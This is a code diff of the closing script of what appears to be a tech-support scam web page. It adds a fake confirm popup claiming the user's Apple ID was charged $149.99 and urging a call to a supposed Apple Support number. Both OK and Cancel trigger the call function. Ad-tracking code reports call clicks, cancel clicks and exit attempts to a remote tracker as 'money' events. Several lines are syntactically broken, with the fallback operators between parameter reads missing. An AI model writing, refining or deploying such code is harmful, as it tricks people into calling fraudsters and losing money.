@@ -371,69 +371,76 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
 
 <script>
-// ========== REDTRACK EXOCLICK TRACKING (money_ events) ==========
-(function() {
-  // Parse ExoClick + RedTrack params
-  const params = new URLSearchParams(window.location.search);
-  const clickid = params.get('ref_id')  params.get('clickid')  params.get('cid');
-  const zoneId = params.get('sub7')  params.get('zone_id')  params.get('zone');
-  
-  function sendRedTrackEvent(eventName, revenue = 0) {
-    if (!clickid) return;
-    
-    const postbackUrl = https://trk.adultdatedesire.site/postback? +
-      clickid=${encodeURIComponent(clickid)}& +
-      event=${encodeURIComponent(eventName)}& +
-      zone=${encodeURIComponent(zoneId || 'unknown')}& +
-      revenue=${revenue};
-    
-    const img = new Image(1, 1);
-    img.src = postbackUrl;
+// ========= RedTrack money-page tracking =========
+(function () {
+  // 1) Read RedTrack / ExoClick params from URL
+  var qs = new URLSearchParams(window.location.search);
+  var clickid = qs.get('ref_id')  qs.get('clickid')  qs.get('cid');
+  var zoneId  = qs.get('sub7')    qs.get('zone_id')  qs.get('zone');
+  var zoneVal = zoneId || 'unknown';
+
+  function sendMoneyEvent(eventName, revenue) {
+    if (!clickid) {
+      console.log('[RedTrack] No clickid found, skip', eventName);
+      return;
+    }
+    var rev = typeof revenue === 'number' ? revenue : 0;
+    var url = 'https://trk.adultdatedesire.site/postback'
+            + '?clickid=' + encodeURIComponent(clickid)
+            + '&event='   + encodeURIComponent(eventName)
+            + '&zone='    + encodeURIComponent(zoneVal)
+            + '&revenue=' + encodeURIComponent(rev);
+
+    var img = new Image(1,1);
+    img.src = url;
+    console.log('[RedTrack] money event sent:', eventName, 'zone:', zoneVal, 'clickid:', clickid);
   }
 
-  // 1. OVERRIDE CALL BUTTON (your okkkk() function)
-  const originalOkkkk = window.okkkk;
-  window.okkkk = function() {
-    // TRACK money_call_click FIRST
-    sendRedTrackEvent('money_call_click');
-    
-    // Run your original function
-    if (originalOkkkk) originalOkkkk();
+  // 2) Wrap your existing okkkk() to track call_click
+  var originalOkkkk = window.okkkk;
+  window.okkkk = function () {
+    // Track that call is being initiated from money page
+    sendMoneyEvent('money_call_click', 0);
+    if (typeof originalOkkkk === 'function') {
+      originalOkkkk();
+    }
   };
 
-  // 2. AUTO-FIND OK BUTTONS (no changes needed)
-  document.addEventListener('DOMContentLoaded', function() {
-    const okButtons = document.querySelectorAll(
-      'button, [role="button"], .btn, .button, input[type="button"], input[type="submit"]'
-    );
-    
-    okButtons.forEach(btn => {
-      const text = btn.textContent.toLowerCase();
-      if (text.includes('ok')  text.includes('yes')  text.includes('confirm') || text.includes('continue')) {
-        btn.addEventListener('click', function() {
-          sendRedTrackEvent('money_ok_click');
-        });
-      }
-    });
-  });
+  // 3) Wrap your confirm popup logic in myFunction() to separate OK vs Cancel
+  var originalMyFunction = window.myFunction;
+  window.myFunction = function () {
+    // Replicate your original logic but add tracking
+    var msg = "Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-5991 to Freeze it!.";
+    var res = confirm(msg);
 
-  // 3. EXIT INTENT
-  let exitIntentFired = false;
-  document.addEventListener('mouseleave', function(e) {
-    if (e.clientY <= 0 && !exitIntentFired) {
-      sendRedTrackEvent('money_exit_intent');
-      exitIntentFired = true;
+    if (res) {
+      // User pressed OK on confirm
+      sendMoneyEvent('money_ok_click', 0);
+      okkkk();  // will also send money_call_click via wrapper above
+    } else {
+      // User pressed Cancel on confirm
+      sendMoneyEvent('money_cancel_click', 0);
+      okkkk();  // your original behavior was calling anyway
+    }
+  };
+
+  // 4) Exit intent (mouse leaves top of viewport)
+  var exitFired = false;
+  document.addEventListener('mouseleave', function (e) {
+    if (!exitFired && e.clientY <= 0) {
+      exitFired = true;
+      sendMoneyEvent('money_exit_intent', 0);
     }
   });
 
-  // 4. PAGE VIEW
+  // 5) Money page view event
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => sendRedTrackEvent('money_page_view'));
+    document.addEventListener('DOMContentLoaded', function () {
+      sendMoneyEvent('money_page_view', 0);
+    });
   } else {
-    sendRedTrackEvent('money_page_view');
+    sendMoneyEvent('money_page_view', 0);
   }
-
-  console.log('Money page tracking active | Zone:', zoneId, 'ClickID:', clickid);
 })();
 </script>
 </body></html>
